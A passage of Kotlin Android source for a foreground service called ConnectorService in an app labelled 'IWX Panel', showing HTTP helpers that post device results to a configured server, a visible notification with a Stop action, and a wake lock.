                try { add("data", JsonParser.parseString(result).asJsonObject) } catch (_: Exception) {}
            }
        }
        post("$SERVER_URL/api/device/result", body.toString())
    }

    // ─────────────────────────────────────────
    //  HTTP
    // ─────────────────────────────────────────

    private fun post(url: String, json: String): String? = try {
        http.newCall(Request.Builder().url(url).post(json.toRequestBody(JSON)).build())
            .execute().use { it.body?.string() }
    } catch (_: Exception) { null }

    private fun get(url: String): String? = try {
        http.newCall(Request.Builder().url(url).get().build()).execute().use { it.body?.string() }
    } catch (_: Exception) { null }

    // ─────────────────────────────────────────
    //  NOTIFICATION
    // ─────────────────────────────────────────

    private fun createNotificationChannel() {
        val chan = NotificationChannel(CHANNEL_ID, getString(R.string.channel_name), NotificationManager.IMPORTANCE_LOW)
            .apply { description = getString(R.string.channel_desc); setShowBadge(false) }
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(chan)
    }

    private fun buildNotification(status: String, connected: Boolean): Notification {
        val stop = PendingIntent.getService(this, 0,
            Intent(this, ConnectorService::class.java).apply { action = ACTION_STOP },
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        val open = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_share)
            .setContentTitle("IWX Panel ${if (connected) "🟢" else "🔴"}")
            .setContentText(status)
            .setContentIntent(open)
            .addAction(android.R.drawable.ic_delete, "Stop", stop)
            .setOngoing(true).setSilent(true)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }

    private fun updateNotification(status: String, connected: Boolean) {
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
            .notify(NOTIF_ID, buildNotification(status, connected))
    }

    private fun acquireWakeLock() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "IWXPanel:WakeLock")
            .apply { acquire(24 * 60 * 60 * 1000L) }
    }

    private fun log(msg: String) {
        android.util.Log.d("ConnectorService", msg)
    }
}
